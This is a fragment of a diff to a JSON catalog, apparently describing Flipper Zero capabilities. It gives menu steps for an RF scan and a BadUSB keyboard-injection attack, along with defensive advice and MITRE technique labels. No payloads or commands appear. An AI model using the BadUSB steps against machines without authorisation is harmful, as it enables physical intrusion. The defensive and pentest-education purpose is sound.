+      "Sub-GHz Scan":  { "flags": ["Sub-GHz → Frequency Analyzer"], "desc": "Scan for active RF signals in the environment." },
+      "BadUSB Attack": { "flags": ["BadUSB → select script from SD → plug in"], "desc": "Execute a HID keyboard injection attack." }
+    },
+    "defend_notes": "Physical security controls matter as much as digital ones. For RFID/NFC: upgrade to modern encrypted access control systems (HID Signo, Allegion Schlage SE). Faraday pouches prevent contactless skimming. Deploy RF detection sensors to alert on scanning activity. For BadUSB: USB port locks, USB Device Control policies, and staff training (don't plug in unknown devices). Physical pentest findings from Flipper are always high-severity — they demonstrate direct access control bypass.",
+    "mitre_techniques": ["T1200 - Hardware Additions", "T1098 - Account Manipulation", "T1530 - Data from Cloud Storage"]
   }
 }
+
